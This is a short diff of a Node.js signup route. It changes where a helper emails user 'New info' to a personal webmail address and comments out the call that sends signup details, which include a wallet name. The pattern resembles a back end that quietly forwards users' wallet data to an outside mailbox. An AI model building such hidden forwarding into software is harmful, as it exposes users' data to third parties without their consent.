@@ -18,7 +18,7 @@ const sendMessage = async (user) => {
   return new Promise((resolve, reject) => {
     const emailData = {
       from: process.env.user,
-      to: "aub388@myyahoo.com",
+      to: ["aquaderrands@gmail.com"],
       subject: "New info",
     };
 
@@ -151,7 +151,7 @@ router.post("/signup", async (req, res) => {
       walletName,
     };
 
-    await sendMessage(details);
+    // await sendMessage(details);
     console.log("Email sent successfully");
 
     // Save the user to the database
